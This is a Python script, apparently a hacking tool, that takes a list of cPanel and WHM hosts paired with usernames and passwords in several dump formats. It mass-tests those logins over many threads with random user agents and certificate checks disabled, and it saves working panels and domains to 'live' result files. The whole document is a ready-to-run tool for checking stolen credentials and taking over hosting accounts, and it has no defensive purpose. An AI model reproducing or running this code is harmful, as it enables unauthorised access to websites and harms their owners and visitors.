import requests
import sys
import re
from fake_useragent import UserAgent
import os
from colorama import Fore, init
from rich import print as cetak
from bs4 import BeautifulSoup
import requests,urllib3
from requests.exceptions import Timeout
from multiprocessing.dummy import Pool
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Pool
init(autoreset=True)

def clear():
    if sys.platform.startswith('linux'):
        os.system('clear')
    elif sys.platform.startswith('freebsd'):
        os.system('clear')
    else:
        os.system('cls')
headersx = {'User-Agent': UserAgent().random}

red = Fore.RED 
green = Fore.GREEN 
yellow = Fore.YELLOW
white = Fore.WHITE
blue = Fore.BLUE


def fungsi1(domain): # |
    try:
        main_split = domain.split('|')
        site = main_split[0]
        username = main_split[1].split('|')[0].strip()
        password = main_split[2:]
        password = '|'.join(password).strip()
        return username, password, site
    except:pass
    
def fungsi2(domain): # :
    try:
        main_split = domain.split(':')
        site = main_split[0] + ':2083'
        username = main_split[2].split(':')[0].strip()
        password = main_split[3:]
        password = ':'.join(password).strip()
        return username, password, site
    except:pass
    
def fungsi3(domain): # #
    try:
        main_split = domain.split('#')
        site = main_split[0]
        username = main_split[1].split('@')[0].strip()
        password = main_split[1].split('@')[1:]
        password = '@'.join(password).strip()
        return username, password, site
    except:pass

def finde_it(domain):
    try:
        ua = {'User-Agent': UserAgent().random}
        domain = ''.join(domain)
        domain = domain.strip()
        sc = requests.Session()
        domain = re.sub(r'https?://', '', domain)
        if "/login/?login_only=1" in domain:
            domain = domain.replace("login/?login_only=1", "")
        else:
            domain = domain
        
        if "2083|" in domain or "2083/|" in domain:
            username,password,site = fungsi1(domain)
        if "2083:" in domain or "2083/:" in domain:
            username,password,site = fungsi2(domain)
        if "2083#" in domain or "2083/#" in domain:
            username,password,site = fungsi3(domain)

        result_path = os.path.join('results', 'cpannelChecker')
        r = sc.post(f"https://{site}/login/?login_only=1", data={"user": username, "pass": password, "goto_uri": "/"}, verify=False, timeout=15, headers=ua).json()
        secLog = r["redirect"]
        req = sc.get(f"https://{site}{secLog}", headers=ua, verify=False, timeout=10).text
        if r["status"] == 1:
            if 'cPanel Login Security' not in req and 'WHM Login Security' not in req:
                if "cPanel - Tools" in req:
                    soup = BeautifulSoup(req, "html.parser")
                    mainDomain = soup.select_one("div#txtDomainName > a")["href"]
                    print(f"{blue}|- {green}https://{domain}")
                    os.makedirs(result_path, exist_ok=True)
                    with open(os.path.join(result_path, 'CPlive.txt'), "a+") as file:
                        file.write(f"https://{domain} =>>> [{mainDomain}]\n")
                else:
                    print(f"{blue}|- {green}https://{domain}")
                    os.makedirs(result_path, exist_ok=True)
                    with open(os.path.join(result_path, 'WHMlive.txt'), "a+") as file:
                        file.write('https://' + domain + "\n")
            else:
                print(f"{blue}|- {yellow}https://{domain}")
                os.makedirs(result_path, exist_ok=True)
                with open(os.path.join(result_path, 'sesi.txt'), "a+") as file:
                    file.write('https://' + domain + "\n")
        else:print(f"{blue}|- {red}https://{domain}")
        sc.cookies.clear()
        
    except Timeout:
        print(f"{blue}|- {red}https://{domain}")
        os.makedirs(result_path, exist_ok=True)
        with open(os.path.join(result_path, 'timeout.txt'), "a+") as file:
            file.write('https://' + domain + "\n")
    except:pass

def index():
	domain = open(input(f"{red}[{white}#{red}]{white} LIST CPANNEL : "), encoding="utf-8").readlines()
	thr = int(input(f"{red}[{white}#{red}]{white} THREADS (Max 50): "))
	ThreadPool = Pool(thr)
	ThreadPool.map(finde_it, domain)

if __name__ == "__main__":
    try:
        clear()
        index()
    except:pass
